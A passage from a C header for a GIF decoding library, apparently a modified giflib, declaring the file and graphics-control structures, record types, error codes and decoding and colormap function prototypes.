	GifWord SWidth, SHeight;         /* Size of virtual canvas */
//    GifWord SColorResolution;        /* How many colors can we generate? */
	GifWord SBackGroundColor;        /* Background color for virtual canvas */
//    GifByteType AspectByte;	     /* Used to compute pixel aspect ratio */
	ColorMapObject *SColorMap;
	/* Global colormap, NULL if nonexistent. */
	uint_fast32_t ImageCount;
	/* Number of current image (both APIs) */
	GifImageDesc Image;
	/* Current image (low-level API) */
	SavedImage *SavedImages;         /* Image sequence (high-level API) */
//    int ExtensionBlockCount;         /* Count extensions past last image */
//    ExtensionBlock *ExtensionBlocks; /* Extensions past last image */
	int Error;
	/* Last error condition reported */
	void *UserData;
	/* hook to attach user data (TVT) */
	GifFilePrivateType *Private;                   /* Don't mess with this! */
} GifFileType;

//#define GIF_ASPECT_RATIO(n)    ((n)+15.0/64.0)

typedef enum {
	UNDEFINED_RECORD_TYPE,
	SCREEN_DESC_RECORD_TYPE,
	IMAGE_DESC_RECORD_TYPE, /* Begin with ',' */
			EXTENSION_RECORD_TYPE, /* Begin with '!' */
			TERMINATE_RECORD_TYPE   /* Begin with ';' */
} GifRecordType;

/* func type to read gif data from arbitrary sources (TVT) */
typedef uint_fast8_t (*InputFunc)(GifFileType *, GifByteType *, uint_fast8_t);

/******************************************************************************
 GIF89 structures
******************************************************************************/

typedef struct GraphicsControlBlock {
	uint_fast8_t DisposalMode;
#define DISPOSAL_UNSPECIFIED      0       /* No disposal specified. */
#define DISPOSE_DO_NOT            1       /* Leave image in place */
#define DISPOSE_BACKGROUND        2       /* Set area too background color */
#define DISPOSE_PREVIOUS          3       /* Restore to previous content */
//    bool UserInputFlag;      /* User confirmation required before disposal */
	uint_fast32_t DelayTime;
	/* pre-display delay in 0.01sec units */
	int TransparentColor;    /* Palette index for transparency, -1 if none */
#define NO_TRANSPARENT_COLOR    -1
} GraphicsControlBlock;

/******************************************************************************
 GIF decoding routines
******************************************************************************/

/* Main entry points */
GifFileType *DGifOpen(void *userPtr, InputFunc readFunc, int *Error);

/* new one (TVT) */
int DGifCloseFile(GifFileType *GifFile);

#define D_GIF_ERR_OPEN_FAILED    101    /* And DGif possible errors. */
#define D_GIF_ERR_READ_FAILED    102
#define D_GIF_ERR_NOT_GIF_FILE   103
#define D_GIF_ERR_NO_SCRN_DSCR   104
#define D_GIF_ERR_NO_IMAG_DSCR   105
#define D_GIF_ERR_NO_COLOR_MAP   106
#define D_GIF_ERR_WRONG_RECORD   107
#define D_GIF_ERR_DATA_TOO_BIG   108
#define D_GIF_ERR_NOT_ENOUGH_MEM 109
#define D_GIF_ERR_CLOSE_FAILED   110
#define D_GIF_ERR_NOT_READABLE   111
#define D_GIF_ERR_IMAGE_DEFECT   112
#define D_GIF_ERR_EOF_TOO_SOON   113

#define E_GIF_SUCCEEDED          0
#define E_GIF_ERR_OPEN_FAILED    1    /* And EGif possible errors. */
#define E_GIF_ERR_WRITE_FAILED   2
#define E_GIF_ERR_HAS_SCRN_DSCR  3
#define E_GIF_ERR_HAS_IMAG_DSCR  4
#define E_GIF_ERR_NO_COLOR_MAP   5
#define E_GIF_ERR_DATA_TOO_BIG   6
#define E_GIF_ERR_NOT_ENOUGH_MEM 7
#define E_GIF_ERR_DISK_IS_FULL   8
#define E_GIF_ERR_CLOSE_FAILED   9
#define E_GIF_ERR_NOT_WRITEABLE  10

/* These are legacy.  You probably do not want to call them directly */
int DGifGetScreenDesc(GifFileType *GifFile);

int DGifGetRecordType(GifFileType *GifFile, GifRecordType *GifType);

int DGifGetImageDesc(GifFileType *GifFile, bool changeImageCount);

int DGifGetLine(GifFileType *GifFile, GifPixelType *GifLine, uint_fast32_t GifLineLen);

int DGifGetExtension(GifFileType *GifFile, int *GifExtCode,
                     GifByteType **GifExtension);

int DGifGetExtensionNext(GifFileType *GifFile, GifByteType **GifExtension);

int DGifGetCodeNext(GifFileType *GifFile, GifByteType **GifCodeBlock);

int EGifCompressLine(GifFilePrivateType *Private, unsigned char *Line, const int LineLen);
/*****************************************************************************
 Everything below this point is new after version 1.2, supporting `slurp
 mode' for doing I/O in two big belts with all the image-bashing in core.
******************************************************************************/

/******************************************************************************
 Color map handling from gif_alloc.c
******************************************************************************/

extern ColorMapObject *GifMakeMapObject(uint_fast8_t BitsPerPixel,
                                        const GifColorType *ColorMap);

extern void GifFreeMapObject(ColorMapObject *Object);

//extern int GifBitSize(int n);
#include <sys/types.h>
#include <errno.h>
#include <stdlib.h>
#include <limits.h>

/******************************************************************************
 Support for the in-core structures allocation (slurp mode).              
******************************************************************************/

//extern void GifFreeExtensions(int *ExtensionBlock_Count,
//			      ExtensionBlock **ExtensionBlocks);
extern void GifFreeSavedImages(GifFileType *GifFile);

/******************************************************************************
 5.x functions for GIF89 graphics control blocks
******************************************************************************/

int DGifExtensionToGCB(const size_t GifExtensionLength,
                       const GifByteType *GifExtension,
                       GraphicsControlBlock *GCB);

#endif /* _GIF_LIB_H */

/* end */
```
